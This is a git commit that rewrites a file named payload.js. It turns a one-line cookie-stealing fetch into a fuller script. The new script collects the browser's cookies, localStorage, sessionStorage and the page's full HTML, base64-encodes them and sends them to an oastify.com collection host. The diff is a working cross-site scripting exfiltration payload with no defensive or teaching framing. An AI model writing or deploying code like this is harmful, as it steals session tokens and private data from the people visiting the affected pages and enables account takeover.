574bff034da7d72e1089d0e47f770442ea1ad911
Elyor <109429042+Elliy0r@users.noreply.github.com>
2025-09-04 15:47:01 +0500

    Update payload.js

--- payload.js
+++ payload.js
@@ -1,3 +1,16 @@
-fetch("https://mmc08w6hfx7im3o9ah4u42ekibo2cs0h.oastify.com/?c=" + document.cookie)
-  .catch(err => {});
-mmc08w6hfx7im3o9ah4u42ekibo2cs0h.oastify.com
+(function(){
+  try {
+    let data = {
+      cookie: document.cookie,
+      localStorage: JSON.stringify(localStorage),
+      sessionStorage: JSON.stringify(sessionStorage),
+      html: document.documentElement.innerHTML
+    };
+
+    fetch("https://mmc08w6hfx7im3o9ah4u42ekibo2cs0h.oastify.com/?d=" + btoa(JSON.stringify(data)))
+      .catch(()=>{});
+  } catch(e) {
+    fetch("https://mmc08w6hfx7im3o9ah4u42ekibo2cs0h.oastify.com/?err=" + encodeURIComponent(e.toString()))
+      .catch(()=>{});
+  }
+})();
